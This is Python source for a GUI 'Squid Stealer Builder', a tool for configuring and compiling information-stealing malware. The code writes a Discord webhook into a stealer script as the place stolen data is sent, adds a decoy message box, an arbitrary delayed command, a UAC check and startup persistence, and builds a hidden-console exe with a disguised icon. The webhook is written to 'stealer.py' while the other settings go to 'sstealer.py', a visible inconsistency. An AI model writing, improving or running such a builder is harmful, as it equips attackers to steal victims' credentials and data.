import os
import shlex
import presets
import customtkinter as ctk
from PIL import Image
from tkinter import messagebox, filedialog

def change_color(img, target_color, new_color):
    img = img.convert("RGBA")
    datas = img.getdata()
    
    new_data = []
    for item in datas:
        if item[:3] == target_color:
            new_data.append(new_color + (item[3],))
        else:
            new_data.append(item)
    
    img.putdata(new_data)
    return img

def hex_to_rgb(hex_code: str):
    hex_code = hex_code.lstrip('#')
    rgb = tuple(int(hex_code[i:i+2], 16) for i in (0, 2, 4))
    return rgb

def validate_webhook(webhook):
    return "api/webhooks" in webhook

def replace_webhook(webhook):
    file_path = "stealer.py"

    with open(file_path, "r", encoding="utf-8") as file:
        lines = file.readlines()

    for i, line in enumerate(lines):
        if line.strip().startswith("h00k ="):
            lines[i] = f'h00k = "{webhook}"\n'
            break

    with open(file_path, "w", encoding="utf-8") as file:
        file.writelines(lines)

def replace_msgbox(title: str, message: str, box_type: str, delay: str):
    title = title.strip()
    if not title:
        return messagebox.showerror("Error", "Title cannot be empty.")
    
    message = message.strip()
    if not message:
        return messagebox.showerror("Error", "Message cannot be empty.")
    
    try:
        delay = int(delay)
    except:
        return messagebox.showerror("Error", "Delay must be a number.")
    
    if delay < 0:    return messagebox.showerror("Error", "Delay cannot be negative.")
    if delay > 3600: return messagebox.showerror("Error", "Delay cannot be greater than 3600.")
    
    file_path = "sstealer.py"

    with open(file_path, "r", encoding="utf-8") as file:
        lines = file.readlines()

    mode_replaced = False
    title_replaced = False
    message_replaced = False
    box_type_replaced = False
    delay_replaced = False

    for i, line in enumerate(lines):
        if line.strip().startswith("MODE ="):
            lines[i] = f'MODE = "Message Box"\n'
            mode_replaced = True
        elif line.strip().startswith("TITLE ="):
            lines[i] = f'TITLE = "{title}"\n'
            title_replaced = True
        elif line.strip().startswith("MESSAGE ="):
            lines[i] = f'MESSAGE = "{message}"\n'
            message_replaced = True
        elif line.strip().startswith("BOX_TYPE ="):
            lines[i] = f'BOX_TYPE = "{box_type}"\n'
            box_type_replaced = True
        elif line.strip().startswith("DELAY ="):
            lines[i] = f'DELAY = {round(delay)}\n'
            delay_replaced = True
        
        if mode_replaced and title_replaced and message_replaced and box_type_replaced and delay_replaced:
            break

    with open(file_path, "w", encoding="utf-8") as file:
        file.writelines(lines)

def check_shlex(command):
    try:
        args = shlex.split(command)
    except Exception as e:
        messagebox.showerror("Improper command", f"{e.__class__.__name__}: {e}")
        return None
    return args

def replace_command(command: str, delay: str):
    command = command.strip()
    if not command:
        return messagebox.showerror("Error", "Command cannot be empty.")
    
    args = check_shlex(command)
    if not args:
        raise ValueError("shlex")
    
    try:
        delay = int(delay)
    except:
        return messagebox.showerror("Error", "Delay must be a number.")
    
    if delay < 0:    return messagebox.showerror("Error", "Delay cannot be negative.")
    if delay > 3600: return messagebox.showerror("Error", "Delay cannot be greater than 3600.")
    
    file_path = "sstealer.py"

    with open(file_path, "r", encoding="utf-8") as file:
        lines = file.readlines()

    mode_replaced = False
    command_replaced = False
    delay_replaced = False

    for i, line in enumerate(lines):
        if line.strip().startswith("MODE ="):
            lines[i] = f'MODE = "Run Command"\n'
            mode_replaced = True
        elif line.strip().startswith("COMMAND_ARGS ="):
            lines[i] = f'COMMAND_ARGS = {args}\n'
            command_replaced = True
        elif line.strip().startswith("DELAY ="):
            lines[i] = f'DELAY = {round(delay)}\n'
            delay_replaced = True
        
        if mode_replaced and command_replaced and delay_replaced:
            break

    with open(file_path, "w", encoding="utf-8") as file:
        file.writelines(lines)

def replace_uac_check():
    file_path = "sstealer.py"

    with open(file_path, "r", encoding="utf-8") as file:
        lines = file.readlines()

    for i, line in enumerate(lines):
        if line.strip().startswith("MODE ="):
            lines[i] = f'MODE = "UAC Check"\n'
            break

    with open(file_path, "w", encoding="utf-8") as file:
        file.writelines(lines)

def replace_run_at_startup():
    file_path = "sstealer.py"

    with open(file_path, "r", encoding="utf-8") as file:
        lines = file.readlines()

    for i, line in enumerate(lines):
        if line.strip().startswith("RUN_AT_STARTUP ="):
            lines[i] = f'RUN_AT_STARTUP = {True if run_at_startup_checkbox.get() else False}\n'
            break

    with open(file_path, "w", encoding="utf-8") as file:
        file.writelines(lines)

def replace_debug_mode():
    file_path = "sstealer.py"

    with open(file_path, "r", encoding="utf-8") as file:
        lines = file.readlines()

    for i, line in enumerate(lines):
        if line.strip().startswith("DEBUG_MODE ="):
            lines[i] = f'DEBUG_MODE = {True if debug_mode_checkbox.get() else False}\n'
            break

    with open(file_path, "w", encoding="utf-8") as file:
        file.writelines(lines)

def select_icon():
    icon_path = filedialog.askopenfilename(filetypes=[("Image files", "*.png *.jpg *.jpeg *.bmp *.gif *.tiff *.webp *.ico")])
    return icon_path

def build_exe():
    webhook = webhook_entry.get()
    if not validate_webhook(webhook):
        return messagebox.showerror("Error", "Invalid webhook URL!\nAre you sure this is a Discord webhook URL?")
    
    replace_webhook(webhook)
    replace_run_at_startup()
    replace_debug_mode()

    icon = True
    if logo_dropdown.get() == "Squid Logo":
        icon_path = r"assets\logo.ico"
    elif logo_dropdown.get() == "Custom Logo":
        icon_path = select_icon()
    else:
        icon = False

    if icon:
        if not icon_path:
            return messagebox.showerror("Error", "No icon file selected.")
        else:
            icon_option = f' --icon="{icon_path}"'
    else:
        icon_option = ""
    
    if mode_dropdown.get() == "Do Nothing":
        pass
    elif mode_dropdown.get() == "Message Box":
        replace_msgbox(*[widget.get() for widget in mode_value_widgets])
    elif mode_dropdown.get() == "Run Command":
        replace_command(*[widget.get() for widget in mode_value_widgets])
    elif mode_dropdown.get() == "UAC Check":
        replace_uac_check()
    else:
        pass
    
    messagebox.showinfo("Information", "Build process will start when you click OK. This may take a while.\nBuilt file won't be undetected (FUD).")

    build_command = f"pyinstaller sstealer.py --noconsole --noconfirm --onefile{icon_option}"
    try:
        exit_code = os.system(build_command)
    except KeyboardInterrupt:
        print("^C")
        exit_code = "KeyboardInterrupt"

    if exit_code == 0: msg_args = ("Success", "Build process completed successfully.\nCheck the dist folder for the exe.")
    else:              msg_args = ("Error",  f"Build process failed.\nExit code: {exit_code}")
    messagebox.showinfo(*msg_args)

## CONFIG ##
frame_options = {
    "fg_color": "#101010"
}

label_options = {
    "text_color": "white"
}

entry_options = {
    "width": 340,
    "height": 30,
    "fg_color": "#202020",
    "text_color": "white",
    "border_width": 1,
    "border_color": "#202020",
    "corner_radius": 100
}

optionmenu_options = {
    "width": 340,
    "height": 30,
    "fg_color": "#202020",
    "text_color": "white",
    "button_color": "#202020",
    "button_hover_color": "#323232",
    "dropdown_fg_color": "#111111",
    "dropdown_text_color": "white",
    "dropdown_hover_color": "#222222",
    "corner_radius": 18,
    "anchor": "w"
}

checkbox_options = {
    "fg_color": "#101010",
    "text_color": "white",
    "border_color": "#1d1d1d",
    "border_width": 2,
    "hover_color": "#333333",
    "checkbox_width": 20,
    "checkbox_height": 20,
    "corner_radius": 100,
    "onvalue": 1,
    "offvalue": 0
}

button_options = {
    "text_color": "white",
    "font": ("Arial Black", 14),
    "fg_color": "#101010",
    "hover_color": "#1e1e1e",
    "corner_radius": 30
}

VERSION = "1.0"
ICON_COLOR = hex_to_rgb("#FFFFFF")

ctk.set_appearance_mode("dark")
app = ctk.CTk(fg_color="black")
app.title(f"Squid Stealer Builder ~ Version {VERSION}")
app.iconbitmap(r"assets\logo white circle.ico")
app.geometry("720x480")
app.resizable(False, False)

app.update_idletasks()
screen_width = app.winfo_screenwidth()
screen_height = app.winfo_screenheight()
x = (screen_width - app.winfo_reqwidth()) // 2
y = (screen_height - app.winfo_reqheight()) // 2
app.geometry(f"+{x}+{y}")

logo = Image.open(r"assets\logo white circle.png")
logo_tk = ctk.CTkImage(logo, size=(32, 32))

webhook = Image.open(r"assets\icons\webhook.png")
webhook = change_color(webhook, hex_to_rgb("#000000"), ICON_COLOR)
webhook_tk = ctk.CTkImage(webhook)

img = Image.open(r"assets\icons\img.png")
img = change_color(img, hex_to_rgb("#000000"), ICON_COLOR)
img_tk = ctk.CTkImage(img)

mode = Image.open(r"assets\icons\mode.png")
mode = change_color(mode, hex_to_rgb("#000000"), ICON_COLOR)
mode_tk = ctk.CTkImage(mode)

startup = Image.open(r"assets\icons\startup.png")
startup = change_color(startup, hex_to_rgb("#000000"), ICON_COLOR)
startup_tk = ctk.CTkImage(startup)

title_frame = ctk.CTkFrame(master=app, **frame_options)
title_frame.place(relx=0.5, rely=0.02, anchor="n")

logo_label = ctk.CTkLabel(master=title_frame, image=logo_tk, text="")
logo_label.pack(side=ctk.LEFT, padx=10, pady=10)

text_label = ctk.CTkLabel(master=title_frame, text=f"Squid Stealer Builder ~ Version {VERSION}", text_color="white", font=("Helvetica", 26))
text_label.pack(side=ctk.LEFT, padx=10, pady=10)

app_grid = ctk.CTkFrame(master=app, **frame_options)
app_grid.configure(fg_color="transparent")
app_grid.place(relx=0.5, rely=0.5, anchor="center")

fields_frame = ctk.CTkFrame(master=app_grid, width=700, **frame_options)
fields_frame.grid(row=0, column=0, padx=5, pady=5)

f_inner_frame = ctk.CTkFrame(master=fields_frame, **frame_options)
f_inner_frame.pack(padx=10, pady=10)

webhook_logo = ctk.CTkLabel(master=f_inner_frame, image=webhook_tk, text="")
webhook_logo.grid(row=0, column=0, padx=2, pady=1)

webhook_label = ctk.CTkLabel(master=f_inner_frame, text="Webhook URL ", **label_options)
webhook_label.grid(row=0, column=1, padx=2, pady=1)

webhook_entry = ctk.CTkEntry(master=f_inner_frame, placeholder_text="Enter your webhook URL", **entry_options)
webhook_entry.grid(row=0, column=2, padx=2, pady=1)

img_logo = ctk.CTkLabel(master=f_inner_frame, image=img_tk, text="")
img_logo.grid(row=2, column=0, padx=2, pady=1)

logo_label = ctk.CTkLabel(master=f_inner_frame, text="Logo ", **label_options)
logo_label.grid(row=2, column=1, padx=2, pady=1)

logo_dropdown = ctk.CTkOptionMenu(master=f_inner_frame, values=["Squid Logo", "Pyinstaller Logo", "Custom Logo"], **optionmenu_options)
logo_dropdown.grid(row=2, column=2, padx=2, pady=1)

def update_mode_frame(option):
    global mode_value_widgets
    
    frame = m_inner_frame
    for widget in m_inner_frame.winfo_children():
        widget.destroy()
    mode_value_widgets = []
    
    entry_opts = entry_options.copy()
    entry_opts["width"] = 500
    optionmenu_opts = optionmenu_options.copy()
    entry_opts["width"] = 500

    if option == "Do Nothing":
        label = ctk.CTkLabel(master=frame, text="No configuration options for this mode.", **label_options)
        label.grid(row=0, column=0)
        
    elif option == "Message Box":
        title_label = ctk.CTkLabel(master=frame, text="Title ", **label_options)
        title_label.grid(row=0, column=0, padx=2, pady=1)
        
        title_entry = ctk.CTkEntry(master=frame, placeholder_text="Enter a title", **entry_opts)
        title_entry.grid(row=0, column=1, padx=2, pady=1)
        mode_value_widgets.append(title_entry)
        
        message_label = ctk.CTkLabel(master=frame, text="Message ", **label_options)
        message_label.grid(row=1, column=0, padx=2, pady=1)
        
        message_entry = ctk.CTkEntry(master=frame, placeholder_text="Enter a message", **entry_opts)
        message_entry.grid(row=1, column=1, padx=2, pady=1)
        mode_value_widgets.append(message_entry)
        
        box_type_label = ctk.CTkLabel(master=frame, text="Box Type ", **label_options)
        box_type_label.grid(row=2, column=0, padx=2, pady=1)
        
        box_type_dropdown = ctk.CTkOptionMenu(master=frame, values=["Info", "Warning", "Error"], **optionmenu_opts)
        box_type_dropdown.grid(row=2, column=1, padx=2, pady=1, sticky="ew")
        mode_value_widgets.append(box_type_dropdown)
        
        delay_label = ctk.CTkLabel(master=frame, text="Delay ", **label_options)
        delay_label.grid(row=3, column=0, padx=2, pady=1)
        
        delay_entry = ctk.CTkEntry(master=frame, placeholder_text="Enter time in seconds to wait", **entry_opts)
        delay_entry.grid(row=3, column=1, padx=2, pady=1)
        mode_value_widgets.append(delay_entry)
        
        def update_widgets(option):
            title_entry.delete(0, "end")
            title_entry.insert(0, presets.messagebox[option]["title"])
            message_entry.delete(0, "end")
            message_entry.insert(0, presets.messagebox[option]["message"])
            box_type_dropdown.set(presets.messagebox[option]["box_type"])
            delay_entry.delete(0, "end")
            delay_entry.insert(0, presets.messagebox[option]["delay"])
        
        presets_dropdown = ctk.CTkOptionMenu(master=frame, values=list(presets.messagebox.keys()), command=update_widgets, **optionmenu_opts)
        presets_dropdown.configure(width=100)
        presets_dropdown.set("Presets")
        presets_dropdown.grid(row=4, column=1, padx=2, pady=1, sticky="e")
    
    elif option == "Run Command":
        command_label = ctk.CTkLabel(master=frame, text="Command ", **label_options)
        command_label.grid(row=0, column=0, padx=2, pady=1)

        command_entry = ctk.CTkEntry(master=frame, placeholder_text="Enter a command to run", **entry_opts)
        command_entry.grid(row=0, column=1, padx=2, pady=1)
        mode_value_widgets.append(command_entry)
        
        delay_label = ctk.CTkLabel(master=frame, text="Delay ", **label_options)
        delay_label.grid(row=1, column=0, padx=2, pady=1)
        
        delay_entry = ctk.CTkEntry(master=frame, placeholder_text="Enter time in seconds to wait", **entry_opts)
        delay_entry.grid(row=1, column=1, padx=2, pady=1)
        mode_value_widgets.append(delay_entry)
        
        def update_widgets(option):
            command_entry.delete(0, "end")
            command_entry.insert(0, presets.run_command[option]["command"])
            delay_entry.delete(0, "end")
            delay_entry.insert(0, presets.run_command[option]["delay"])
        
        presets_dropdown = ctk.CTkOptionMenu(master=frame, values=list(presets.run_command.keys()), command=update_widgets, **optionmenu_opts)
        presets_dropdown.configure(width=100)
        presets_dropdown.set("Presets")
        presets_dropdown.grid(row=2, column=1, padx=2, pady=1, sticky="e")
    
    elif option == "UAC Check":
        label = ctk.CTkLabel(master=frame, text="No configuration options for this mode.", **label_options)
        label.grid(row=0, column=0)
    
    else:
        label = ctk.CTkLabel(master=frame, text="This mode doesn't exist? How did you get here?", **label_options)
        label.grid(row=0, column=0)

mode_logo = ctk.CTkLabel(master=f_inner_frame, image=mode_tk, text="")
mode_logo.grid(row=3, column=0, padx=2, pady=1)

mode_label = ctk.CTkLabel(master=f_inner_frame, text="Mode ", **label_options)
mode_label.grid(row=3, column=1, padx=2, pady=1)

mode_dropdown = ctk.CTkOptionMenu(master=f_inner_frame, values=["Do Nothing", "Message Box", "Run Command", "UAC Check"], command=update_mode_frame, **optionmenu_options)
mode_dropdown.grid(row=3, column=2, padx=2, pady=1)

run_at_startup_logo = ctk.CTkLabel(master=f_inner_frame, image=startup_tk, text="")
run_at_startup_logo.grid(row=4, column=0, padx=2, pady=1)

run_at_startup_checkbox = ctk.CTkCheckBox(master=f_inner_frame, text="Run at Startup", **checkbox_options)
run_at_startup_checkbox.grid(row=4, column=1, padx=2, pady=1)

run_at_startup_label = ctk.CTkLabel(master=f_inner_frame, text="(Would need elevated privilages when file is executed and\nit might not work for a very outdated Windows version)", **label_options)
run_at_startup_label.grid(row=4, column=2, padx=2, pady=1)

mode_frame = ctk.CTkFrame(master=app_grid, width=700, **frame_options)
mode_frame.grid(row=1, column=0, padx=5, pady=5)

m_inner_frame = ctk.CTkFrame(master=mode_frame, **frame_options)
m_inner_frame.pack(padx=10, pady=10)
update_mode_frame("Do Nothing")
mode_value_widgets = []

debug_mode_checkbox = ctk.CTkCheckBox(master=app, text="Debug Mode", **checkbox_options)
debug_mode_checkbox.place(relx=0.02, rely=0.97, anchor="sw")

build_button = ctk.CTkButton(master=app, text="BUILD EXE", width=140, height=40, command=build_exe, **button_options)
build_button.place(relx=0.99, rely=0.98, anchor="se")

print("Created window")

try:
    app.mainloop()
except KeyboardInterrupt:
    print("^C")

print("exited")